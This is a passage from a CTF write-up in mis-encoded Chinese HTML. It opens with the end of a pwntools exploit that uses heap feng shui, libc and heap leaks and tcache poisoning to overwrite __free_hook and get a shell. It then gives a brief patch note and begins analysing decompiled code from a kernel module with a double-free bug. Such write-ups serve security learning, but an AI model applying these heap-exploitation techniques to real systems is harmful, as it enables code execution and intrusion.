class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list_db</span>():<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_db_name</span>(<span class="hljs-params">orig_name:<span class="hljs-built_in">bytes</span>, new_name:<span class="hljs-built_in">bytes</span></span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;5&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the name of database: &quot;</span>)<br>    p.sendline(orig_name)<br>    p.recvuntil(<span class="hljs-string">b&quot;Please input the new name for database: &quot;</span>)<br>    p.sendline(new_name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exp</span>():<br>    <span class="hljs-comment"># pre heap fengshui </span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        add_kv(i, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    exit_db()<br><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    use_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br><br>    exit_db()<br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br>    add_kv(<span class="hljs-number">1919810</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    delete_kv(<span class="hljs-number">1919810</span>)<br><br>    exit_db()<br><br>    delete_db(<span class="hljs-string">b&quot;arttnba4&quot;</span>)<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>)) <span class="hljs-comment"># reget 1919810</span><br><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br>    update_kv(<span class="hljs-number">2</span>, <span class="hljs-string">b&#x27;A&#x27;</span> * (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x10</span> + <span class="hljs-number">8</span>)) <span class="hljs-comment"># db-&gt;name is 114514 now</span><br><br>    <span class="hljs-comment"># fullfill the tcache</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        delete_kv(<span class="hljs-number">1919810</span> + i)<br><br>    <span class="hljs-comment"># get an UAF unsorted chunk and leak libc</span><br>    delete_kv(<span class="hljs-number">114514</span>)<br>    exit_db()<br>    list_db()<br><br>    libc_leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    main_arena = libc_leak - <span class="hljs-number">96</span><br>    __malloc_hook = main_arena - <span class="hljs-number">0x10</span><br>    libc_base = __malloc_hook - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    log.info(<span class="hljs-string">&quot;Get libc addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_leak))<br>    log.success(<span class="hljs-string">&quot;Libc base: &quot;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br><br>    <span class="hljs-comment"># reget the victim</span><br>    use_db(<span class="hljs-string">b&quot;arttnba3&quot;</span>)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        add_kv(<span class="hljs-number">1919810</span> + i, <span class="hljs-string">b&#x27;arttnba3&#x27;</span>)<br><br>    add_kv(<span class="hljs-number">114514</span>, <span class="hljs-string">b&quot;rat3bant&quot;</span>) <span class="hljs-comment"># the victim</span><br><br>    <span class="hljs-comment"># free the victim and leak heap base</span><br>    delete_kv(<span class="hljs-number">1919810</span> + <span class="hljs-number">6</span>)<br>    delete_kv(<span class="hljs-number">114514</span>)<br><br>    exit_db()<br>    list_db()<br>    p.recvuntil(<span class="hljs-string">b&#x27;\tarttnba3\n\t&#x27;</span>)<br>    heap_leak = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    heap_base = heap_leak - <span class="hljs-number">0x1640</span><br>    log.info(<span class="hljs-string">&quot;Get heap addr leak: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_leak))<br>    log.success(<span class="hljs-string">&quot;Heap base: &quot;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>    <span class="hljs-comment"># hijack the tcache list to __free_hook</span><br>    update_db_name(p64(heap_leak)[:<span class="hljs-number">6</span>], <br>                   p64(libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x88</span>) \<br>                   + <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>))<br><br>    <span class="hljs-comment"># overwrite __free_hook by dbname</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba4&quot;</span> * (<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>))<br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;arttnba3&quot;</span> * ((<span class="hljs-number">0x90</span> // <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) \<br>                 + p64(libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>    <span class="hljs-comment"># trigger</span><br>    create_db(<span class="hljs-number">2</span>, <span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br>    delete_db(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)<br><br>    p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    exp()<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå³å¯ get shell</p><p><img src="https://s2.loli.net/2023/07/14/oxBjs2IzF83JucH.png" alt="image.png"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>ç›´æ¥æŠŠå¤šä½™çš„æ¼æ´æŒ‡ä»¤ç»™ nop æ‰å³å¯</p><p><img src="https://s2.loli.net/2023/07/07/SRjxs1QnDpKFowk.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/07/07/XiDM3odbWxmpTRe.png" alt="image.png"></p><h1 id="0x02-kkkï¼ˆå›°éš¾ï¼‰"><a href="#0x02-kkkï¼ˆå›°éš¾ï¼‰" class="headerlink" title="0x02. kkkï¼ˆå›°éš¾ï¼‰"></a>0x02. kkkï¼ˆå›°éš¾ï¼‰</h1><p>ä¸çŸ¥é“ä¸ºå•¥æ²¡äºº <code>break</code> çš„ä¸€é“é¢˜ç›®ï¼Œæ¼æ´æœ¬èº«åˆ©ç”¨çš„ç©ºé—´ä¹ŸæŒºå¤§çš„ï¼Œè€Œä¸”éƒ½æœ‰å¥½å‡ ä¸ªé˜Ÿä¼ <code>fix</code> æˆåŠŸäº†ï¼Œæ€ä¹ˆæœ€åè§£å¼€çš„é˜Ÿä¼æ•°é‡è¿˜æ˜¯ 0 å‘¢  :ï¼ˆ</p><h2 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>é¢˜ç›®æä¾›äº†ä¸€ä¸ª <code>kkk.ko</code>ï¼Œæƒ¯ä¾‹æ‹–å…¥ IDAï¼Œå…¶ <code>ioctl()</code> åªæä¾›äº†ä¸¤ä¸ªåŠŸèƒ½â€”â€”è¯»å– <code>k2u</code> é˜Ÿåˆ—ä¸å†™å…¥ <code>u2k</code> é˜Ÿåˆ—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_ioctl</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2, __int64 a3)</span><br>&#123;<br>  mutex_lock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x1919810</span> )<br>  &#123;<br>    kkk_write_u2k_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( a2 == <span class="hljs-number">0x114514</span> )<br>  &#123;<br>    kkk_read_k2u_queue(a3);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    printk(&amp;unk_143E);<br>  &#125;<br>  mutex_unlock(&amp;ioctl_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™å…¥ <code>u2k</code> é˜Ÿåˆ—é¦–å…ˆä¼šåˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦å·²æ»¡ï¼Œä¹‹ååˆ†é…ä¸€ä¸ª object å¹¶å°†æ•°æ®ä»ç”¨æˆ·ç©ºé—´æ‹·è´åˆ°å†…æ ¸ç©ºé—´ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºåœ¨é˜Ÿåˆ—å½“ä¸­çš„æ¯ä¸ª object éƒ½åº”å½“å¸¦æœ‰ä¸€ä¸ª <code>header</code> ï¼Œåœ¨ <code>header</code> ä¹‹åæ‰æ˜¯çœŸæ­£çš„ç”¨æˆ·æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_write_u2k_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// r13</span><br>  __int64 v2; <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// r15</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// r12</span><br>  __int64 v5; <span class="hljs-comment">// rbx</span><br>  __int64 v7[<span class="hljs-number">2</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-48h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+10h] [rbp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+18h] [rbp-30h]</span><br><br>  v9 = __readgsqword(<span class="hljs-number">0x28</span>u);<br>  v8 = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">1</span>] = <span class="hljs-number">0LL</span>;<br>  v7[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  mutex_lock(&amp;u2k_lock);<br>  v1 = ((_WORD)u2k_tail + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>  <span class="hljs-keyword">if</span> ( u2k_head != v1 &amp;&amp; !copy_from_user(v7, a1, <span class="hljs-number">24LL</span>) &amp;&amp; v8 &lt;= <span class="hljs-number">0xFFFFFFFFFFFFFFE7</span>LL )<br>  &#123;<br>    v2 = _kmalloc(v8 + <span class="hljs-number">24</span>, <span class="hljs-number">4197568LL</span>);<br>    <span class="hljs-keyword">if</span> ( v2 )<br>    &#123;<br>      v3 = v2;<br>      v4 = v8 + <span class="hljs-number">24</span>;<br>      <span class="hljs-keyword">if</span> ( ((v8 + <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2, v8 + <span class="hljs-number">24</span>, <span class="hljs-number">0LL</span>);<br>      <span class="hljs-keyword">if</span> ( copy_from_user(v3, a1, v4) )<br>      &#123;<br>        kfree(v3);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v5 = u2k_tail;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)u2k_tail &gt;= <span class="hljs-number">0x1000</span> )<br>          _ubsan_handle_out_of_bounds(&amp;off_24B0, u2k_tail);<br>        u2k_queue[v5] = v3;<br>        u2k_tail = v1;<br>      &#125;<br>    &#125;<br>  &#125;<br>  mutex_unlock(&amp;u2k_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯»å– <code>k2u</code> é˜Ÿåˆ—åˆ™æ˜¯ç›´æ¥å°†é˜Ÿåˆ—ä¸­çš„ object æ•´ä¸ªæ‹·è´å›ç”¨æˆ·ç©ºé—´ï¼Œæ³¨æ„åˆ°è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼š<strong>å³ä½¿æ•°æ®æ‹·è´å¤±è´¥ä¹Ÿä¼šé‡Šæ”¾ objectï¼Œä½†è¯¥ object ä¸ä¼šå‡ºé˜Ÿåˆ—ï¼Œä»è€Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ä½¿å¾—ä¸€ä¸ª object è¢«å¤šæ¬¡ free</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">kkk_read_k2u_queue</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// rbx</span><br>  __int64 v2; <span class="hljs-comment">// rbx</span><br>  __int64 v3; <span class="hljs-comment">// r12</span><br>  __int64 v4; <span class="hljs-comment">// r14</span><br>  __int16 v5; <span class="hljs-comment">// ax</span><br><br>  mutex_lock(&amp;k2u_lock);<br>  v1 = k2u_head;<br>  <span class="hljs-keyword">if</span> ( k2u_head != k2u_tail )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>      _ubsan_handle_out_of_bounds(&amp;off_24D0, k2u_head);<br>    v2 = k2u_queue[v1];<br>    <span class="hljs-keyword">if</span> ( !copy_to_user(a1, v2, <span class="hljs-number">24LL</span>) )<br>    &#123;<br>      v3 = *(_QWORD *)(v2 + <span class="hljs-number">16</span>);<br>      <span class="hljs-keyword">if</span> ( (v3 &amp; <span class="hljs-number">0xFFFFFFFF80000000</span>LL) != <span class="hljs-number">0</span> )<br>        BUG();<br>      _check_object_size(v2 + <span class="hljs-number">24</span>, *(_QWORD *)(v2 + <span class="hljs-number">16</span>), <span class="hljs-number">1LL</span>);<br>      <span class="hljs-keyword">if</span> ( !copy_to_user(a1 + <span class="hljs-number">24</span>, v2 + <span class="hljs-number">24</span>, v3) )<br>      &#123;<br>        v4 = k2u_head;<br>        v5 = k2u_head;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int64)k2u_head &gt;= <span class="hljs-number">0x1000</span> )<br>        &#123;<br>          _ubsan_handle_out_of_bounds(&amp;off_24F0, k2u_head);<br>          v5 = k2u_head;<br>        &#125;<br>        k2u_queue[v4] = <span class="hljs-number">0LL</span>;<br>        k2u_head = (v5 + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFF</span>;<br>      &#125;<br>    &#125;<br>    kfree(v2);<br>  &#125;<br>  mutex_unlock(&amp;k2u_lock);<br>  <span class="hljs-keyword">return</span> _x86_return_thunk();<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆè¯»å– <code>u2k</code> é˜Ÿåˆ—ä¸å†™å…¥ <code>k2u</code> é˜Ÿåˆ—çš„åŠŸèƒ½åœ¨å“ªå®Œæˆå‘¢ï¼Ÿè®©æˆ‘ä»¬å°†ç›®å…‰æ”¾å›åˆå§‹åŒ–å‡½æ•°ï¼Œåœ¨å®Œæˆè®¾å¤‡æ–‡ä»¶æ³¨å†Œåå…¶ä¼šå¯åŠ¨ä¸€ä¸ª CPU æ ¸å¿ƒæ•°ä¸ªå†…æ ¸çº¿ç¨‹ï¼ˆæœ¬é¢˜ä¸º 1 ä¸ªï¼‰ï¼Œè¯¥çº¿ç¨‹ä¼šæ‰§è¡Œå‡½æ•° <code>kkk_msg_handler_fn()</code>ï¼Œè¿™ä¸ªå‡½æ•°æ¯”è¾ƒé•¿æˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥æ¥åˆ†æ</p><blockquote><p>æœ¬æ¥æƒ³å¼„å¤šä¸ªå†…æ ¸çº¿ç¨‹çš„ï¼Œä½†æ˜¯è¿™æ ·éš¾åº¦å¥½åƒåˆå¤ªé«˜äº†ç‚¹ï¼ˆç¬‘ï¼‰ï¼Œæ‰€ä»¥åªå¼„äº†ä¸€ä¸ª</p></blockquote><p>è¯¥å‡½æ•°æ•´ä½“æ˜¯ä¸€ä¸ªå¤§å¾ªç¯ï¼Œå¼€å¤´æœ‰ä¸ªå°å¾ªç¯å†…éƒ¨ä¼šå¾ªç¯è½®è¯¢ <code>u2k</code> é˜Ÿåˆ—ï¼Œè‹¥ä¸ä¸ºç©ºåˆ™ä»ä¸­å–å‡ºä¸€ä¸ª objectï¼Œè‹¥ object å¼€å¤´çš„å­—æ®µä¸ä¸º <code>1</code> åˆ™é‡Šæ”¾æ‰å¹¶é‡æ–°ç»§ç»­å¾ªç¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __noreturn <span class="hljs-title function_">kkk_msg_handler_fn</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v0; <span class="hljs-comment">// r14</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// esi</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// rdi</span><br>  __int64 v3; <span class="hljs-comment">// rax</span><br>  __int64 v4; <span class="hljs-comment">// r15</span><br>  __int64 v5; <span class="hljs-comment">// rax</span><br>  __int64 v6; <span class="hljs-comment">// rax</span><br>  __int16 v7; <span class="hljs-comment">// cx</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// rdi</span><br>  __int64 v9; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">void</span> *v10; <span class="hljs-comment">// rdi</span><br>  __int64 v11[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span><br><br>  v11[<span class="hljs-number">0</span>] = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      <span class="hljs-keyword">while</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_read_u2k_queue(v11) )<br>        msleep(<span class="hljs-number">1000LL</span>);<br>      v0 = v11[<span class="hljs-number">0</span>];<br>      <span class="hljs-keyword">if</span> ( *(_WORD *)v11[<span class="hljs-number">0</span>] == <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">break</span>;<br>      printk(&amp;unk_1743);<br>LABEL_24:<br>      msg_free(v11[<span class="hljs-number">0</span>]);<br>    &#125;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªå·¨å¤§çš„ switchï¼Œæ ¹æ®ä» <code>u2k</code> é˜Ÿåˆ—ä¸­å–å‡ºçš„ object æŒ‡å®šå­—æ®µçš„å€¼è¿›è¡Œç›¸åº”å¤„ç†ï¼Œä¸»è¦å®ç°äº† <code>tea</code> åŠ å¯†ã€<code>tea</code> è§£å¯†ã€<code>md5</code> å“ˆå¸Œç®—æ³•ä¸‰ç§åŠŸèƒ½</p><p>åœ¨å®Œæˆè¯·æ±‚åä¼šæ ¹æ®é€‰é¡¹ä¸åŒä¸æ‰§è¡Œç»“æœä¸åŒé€‰æ‹©æ˜¯å¦å°†è¯¥ object é‡ç”¨å¹¶å†™å…¥ <code>k2u</code> é˜Ÿåˆ—æˆ–æ˜¯åˆ†é…ä¸€ä¸ªæ–°çš„ <code>object</code> å†™å…¥ <code>k2u</code> é˜Ÿåˆ—ï¼Œå¯¹äº <code>md5</code> å“ˆå¸Œè¯·æ±‚è€Œè¨€æ€»ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„ objectï¼Œè€Œ <code>tea</code> åŠ è§£å¯†è¯·æ±‚åˆ™ä¼šï¼Œä½œä¸ºè¯·æ±‚æ‰§è¡Œçš„ç»“æœè¿”å›ç»™ç”¨æˆ·ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">switch</span> ( v1 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        v5 = msg_alloc(<span class="hljs-number">16LL</span>);<br>        <span class="hljs-keyword">if</span> ( v5 )<br>        &#123;<br>          v4 = v5;<br>          <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)kkk_crypto_hash_md5((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">24</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>)) )<br>          &#123;<br>            printk(&amp;unk_17E1);<br>            v7 = <span class="hljs-number">2</span>;<br>            v6 = <span class="hljs-number">0LL</span>;<br>          &#125;<br>          <span class="hljs-keyword">else</span><br>          &#123;<br>            v6 = <span class="hljs-number">16LL</span>;<br>            v7 = <span class="hljs-number">1</span>;<br>          &#125;<br>          *(_DWORD *)v4 = <span class="hljs-number">196610</span>;<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = v7;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_23;<br>        &#125;<br>        <span class="hljs-keyword">goto</span> LABEL_32;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        v8 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v8 &lt; <span class="hljs-number">0x18</span> || (v8 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_17AD;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v9 = msg_alloc(v8 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v9 )<br>        &#123;<br>LABEL_27:<br>          v10 = &amp;unk_1795;<br>LABEL_31:<br>          printk(v10);<br>          <span class="hljs-keyword">goto</span> LABEL_32;<br>        &#125;<br>        v4 = v9;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)kkk_crypto_tea_decrypt((<span class="hljs-type">void</span> *)(v0 + <span class="hljs-number">40</span>), *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>) &gt;= <span class="hljs-number">0</span> )<br>        &#123;<br>          *(_DWORD *)v4 = <span class="hljs-number">131074</span>;<br>LABEL_22:<br>          *(_WORD *)(v4 + <span class="hljs-number">4</span>) = <span class="hljs-number">1</span>;<br>          *(_QWORD *)(v4 + <span class="hljs-number">8</span>) = *(_QWORD *)(v0 + <span class="hljs-number">8</span>);<br>          v6 = *(_QWORD *)(v0 + <span class="hljs-number">16</span>) - <span class="hljs-number">16LL</span>;<br>LABEL_23:<br>          *(_QWORD *)(v4 + <span class="hljs-number">16</span>) = v6;<br>          kkk_write_k2u_queue(v4);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        v2 = *(_QWORD *)(v11[<span class="hljs-number">0</span>] + <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( v2 &lt; <span class="hljs-number">0x18</span> || (v2 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>        &#123;<br>          v10 = &amp;unk_1761;<br>          <span class="hljs-keyword">goto</span> LABEL_31;<br>        &#125;<br>        v3 = msg_alloc(v2 - <span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">if</span> ( !v3 )<br>          <span 